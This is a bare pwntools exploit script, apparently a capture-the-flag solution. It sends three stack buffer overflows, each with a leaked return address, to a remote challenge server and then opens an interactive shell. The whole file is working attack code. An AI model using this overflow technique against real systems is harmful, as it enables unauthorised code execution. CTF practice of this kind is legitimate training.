from pwn import *
context(arch='amd64', os='linux', log_level='debug')

# io = process('./pwn')
io = remote('111.200.241.244', 61390)
io.recvuntil(b'The switch is:0x')
addr = int(io.recvuntil(b'\n', drop=True), 16)
payload = cyclic(512 + 8) + p64(addr) + b'\n'
io.send(payload)
io.recvuntil(b'The switch is:0x')
addr = int(io.recvuntil(b'\n', drop=True), 16)
payload = cyclic(384 + 8) + p64(addr) + b'\n'
io.send(payload)
io.recvuntil(b'The switch is:0x')
addr = int(io.recvuntil(b'\n', drop=True), 16)
payload = cyclic(256 + 8) + p64(addr) + b'\n'
io.send(payload)
io.interactive()